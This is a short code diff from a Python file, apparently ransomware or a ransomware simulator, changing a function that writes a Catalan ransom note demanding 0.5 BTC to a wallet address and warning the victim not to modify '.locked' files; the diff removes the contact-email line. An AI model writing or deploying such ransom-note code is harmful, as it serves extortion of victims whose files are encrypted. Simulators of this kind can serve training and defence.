@@ -48,7 +48,7 @@ def generar_nota_rescat(directori):
         "Per recuperar les dades, necessites la clau de desxifratge.\n"
         "1. No intentis modificar els fitxers .locked.\n"
         "2. Envia 0.5 BTC a l adreca: bc1qxy2kgdy6jrsqx7644vvv\n"
-        "3. Un cop pagat, envia un correu a: support@simulador.com\n"
+        
     )
 
     ruta_nota = os.path.join(directori, "INSTRUCCIONS_RECUPERACIO.txt")
